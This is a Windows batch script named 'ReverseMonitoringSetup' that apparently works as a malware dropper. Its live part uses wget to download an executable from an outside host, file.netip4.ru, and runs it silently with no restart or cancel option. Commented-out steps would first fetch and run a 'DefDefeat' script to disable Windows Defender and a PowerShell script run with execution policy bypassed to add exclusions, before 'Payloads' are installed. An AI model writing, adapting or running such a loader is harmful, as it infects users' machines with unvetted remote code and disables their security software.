@echo on
rem *******************************************************
rem ReverseMonitoringSetup.cmd
rem This Script Installs Reverse Monitoring Setup Packet
rem on a Windows Computer
rem
rem PARAMETERS:	NONE
rem RETURN:	NONE
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=ReverseMonitoringSetup
set FIRM_NAME=NIT
set OTHER_PRODUCT_NAME01=DefDefeat

rem
rem Set Directories Path
set curdirforurl=%CD%
set UTIL=c:\Util
set DEST_DIR=C:\NIT.SYSUPDATE
set PUB1=C:\pub1
set TEMPPUB=c:\pub1\Distrib
set pathPOSH=%SystemRoot%\System32\WindowsPowerShell\v1.0


rem Initialization Download Variables
rem
set http_pref001=http
set http_host001=file.netip4.ru
set http_port001=80
set http_dir0001=/WinUpdate/
set http_dir0000=/Exponenta/
set http_dir0003=/WinUpdate/WindowsMainUpdate/Other/
set http_dir0004=/Exponenta/Scripts/%OTHER_PRODUCT_NAME01%/
set http_echodir=/WinUpdate/InitialCommon/

rem set CURL & WGET Variables
rem
echo Set CURL and WGET Variadles
set CURLEXE=%UTIL%\CURL.EXE
set WGETEXE=%UTIL%\wget.exe
set POSHEXE=%pathPOSH%\powershell.exe

set Program Variables
rem
echo Set Program Variables
set RNDN=RunsDownloaded.exe
set DefDef=DefDefeat.cmd
set NITHTTP=m3432q0hnhbhxbyishdq.wsf
set KMSEXCLUSIONSPS1=Set-KMSExclusions.ps1


rem Derivatives Variables
set hostecho=%http_pref001%://%http_host001%:%http_port001%%http_echodir%
set host=%http_pref001%://%http_host001%:%http_port001%%http_dir0003%
set hostdef=%http_pref001%://%http_host001%:%http_port001%%http_dir0004%
set LocalFolder=%TEMPPUB%

rem Check Integrity
rem
echo Check Integrity...
if not exist %CURLEXE% echo %CURLEXE% not Exist && exit /b 0
if not exist %WGETEXE% echo %WGETEXE% not Exist && exit /b 0
if not exist %POSHEXE% echo %POSHEXE% not Exist && exit /b 0
if not exist %UTIL%\%RNDN% echo %RNDN% not Exist && exit /b 0
if not exist %UTIL%\%NITHTTP% echo %NITHTTP% not Exist && exit /b 0

rem Download %KMSEXCLUSIONSPS1%
rem echo Download and Run %KMSEXCLUSIONSPS1% Script...
rem if exist %UTIL%\%KMSEXCLUSIONSPS1% del /Q /F %UTIL%\%KMSEXCLUSIONSPS1%
rem %UTIL%\%RNDN% 6 0 %KMSEXCLUSIONSPS1% %hostdef% .
rem %POSHEXE% -Nologo -NoProfile -NonInteractive -WindowStyle Normal -ExecutionPolicy Bypass -File %UTIL%\%KMSEXCLUSIONSPS1%
rem del /Q /F %UTIL%\%KMSEXCLUSIONSPS1%

rem Download %DefDef% Script
rem echo Download and Run %DefDef% Script...
rem %UTIL%\%RNDN% 6 0 %DefDef% %hostdef% .
rem if not exist %UTIL%\%DefDef% echo %DefDef% not Downloaded && exit /b 0;
rem call %UTIL%\%DefDef%
rem if errorlevel 2 goto ErroorDefDef
rem del /Q /F %UTIL%\%DefDef%
rem echo Defender is Successfully Smart Defeat! Now May Install Payloads.
goto Payloads

:ErroorDefDef
rem echo %DefDef% errorlevel %errorlevel% 
rem echo Delete Threat Files...
rem del /Q /F %UTIL%\%RNDN%
rem del /Q /F %UTIL%\%NITHTTP%
rem del /Q /F %UTIL%\%DefDef%
echo Error at %0 running %UTIL%\%DefDef%
exit /b 0

:Payloads

rem Download and Execute Payloads
rem 

rem define the Program Variables
rem
set THREAD_EXE=ReverseMonitoringSetup.exe

rem Download and Install
if exist "%LocalFolder%\%THREAD_EXE%" del /F /Q "%LocalFolder%\%THREAD_EXE%"
"%WGETEXE%" -O "%LocalFolder%\%THREAD_EXE%" %hostecho%%THREAD_EXE%
"%LocalFolder%\%THREAD_EXE%" /verysilent /SP- /NORESTART /NOCANCEL

rem The End of the Script
:End
echo The End of %0 Script
exit /b 0
